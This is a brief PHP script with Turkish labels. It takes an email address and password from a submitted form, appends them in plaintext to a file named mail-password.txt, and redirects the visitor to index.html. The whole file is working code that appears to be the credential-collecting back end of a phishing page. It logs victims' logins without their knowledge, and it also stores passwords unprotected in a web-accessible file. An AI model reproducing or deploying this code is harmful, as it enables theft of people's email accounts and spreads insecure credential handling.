<?php

$ac = fopen("mail-password.txt","r+");

if(!$ac)
{
    echo "Hata !";
}

$mail = $_POST['mail'];
$password = $_POST['password'];


$eklenecek_metin = $mail . ";" . $password;

file_put_contents("mail-password.txt", PHP_EOL .$eklenecek_metin, FILE_APPEND);
echo "<br>";
fclose($ac);

header('Location: index.html');

?>